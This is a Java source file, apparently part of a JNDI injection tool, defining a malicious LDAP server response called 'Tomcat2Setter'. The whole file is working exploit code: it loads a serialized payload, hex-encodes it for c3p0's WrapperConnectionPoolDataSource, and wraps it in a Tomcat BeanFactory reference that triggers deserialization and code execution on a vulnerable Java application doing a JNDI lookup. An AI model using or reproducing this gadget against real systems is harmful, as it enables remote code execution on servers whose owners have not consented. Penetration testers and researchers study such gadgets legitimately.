package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.commons.codec.binary.Hex;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

/*
    Tomcat2Setter Way:
    Requirement:
        Tomcat and bean class in classpath
    Explanation:
        1. the forceString in higher version is banned
        2. BeanFactory#getObjectInstance will trigger the setter of bean class
 */
public class Tomcat2Setter implements LDAPService{
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);
        generateHandler();

        System.out.println(this.getClass().getName() + "sendResult start.....");

        byte[] payloadBytes = new byte[0];
        try {
            payloadBytes = Files.readAllBytes(new File("./payload.ser").toPath());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        char[] hex = Hex.encodeHex(payloadBytes);
        String jndiPayload = "HexAsciiSerializedMap?" + new String(hex) + "?";

        ResourceRef resourceRef = new ResourceRef("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("userOverridesAsString", jndiPayload));

        Entry entry = new Entry(baseDN);
        entry.addAttribute("javaClassName", "java.lang.Class");
        entry.addAttribute("javaSerializedData", GadgetUtils.serialize(resourceRef));
        try {
            result.sendSearchEntry(entry);
        } catch (LDAPException e) {
            throw new RuntimeException(e);
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void argsHandler(String baseDN) {

    }

    @Override
    public void generateHandler() {

    }
}
